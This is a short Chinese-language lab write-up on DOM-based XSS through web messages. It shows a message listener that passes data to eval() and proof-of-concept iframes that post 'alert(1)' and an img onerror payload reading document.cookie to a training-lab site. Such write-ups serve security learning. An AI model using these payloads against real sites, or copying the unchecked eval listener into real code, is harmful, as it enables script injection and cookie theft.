如何使用Web消息作为来源进行攻击

考虑以下代码：

```javascript
<script>
window.addEventListener('message', function(e){
    eval(e.data);
    });
</script>
```

这很容易受到攻击，因为攻击者可以通过构造以下代码来注入JavaScript有效负载iframe：

```javascript
<iframe src="//vulnerable-website"
 onload="this.contentWindow.postMessage('alert(1)','*')">
```

由于事件侦听器无法验证消息的来源，并且该postMessage()方法指定targetOrigin "*"，因此事件侦听器接受有效负载并将其传递到接收器（在本例中为eval()函数）中。



实验：





![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/基于DOM的漏洞/images/D361339E4C9A4F7684FBE90E21F2AD47clipboard.png)

发现网站首页存在一个web消息监听器，并且会将监听到的内容发送到页面。这很可能造成xss漏洞



构造poc:

```javascript
<iframe src="https://your-lab-id.web-security-academy.net/" 
onload="this.contentWindow.postMessage('<img src=1 onerror=alert(document.cookie)>','*')">
```

发送的消息里含有xss代码，造成xss

